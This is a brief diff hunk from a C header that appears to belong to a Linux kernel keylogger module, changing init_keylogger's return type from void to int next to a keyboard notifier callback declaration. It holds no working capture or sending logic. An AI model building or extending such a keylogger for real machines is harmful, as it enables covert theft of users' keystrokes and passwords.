@@ -3,7 +3,7 @@
 
 #define BUFFER_SIZE 0x1000
 
-void init_keylogger(void);
+int init_keylogger(void);
 void exit_keylogger(void);
 
 int keylogger_notifier(struct notifier_block *, unsigned long, void *);
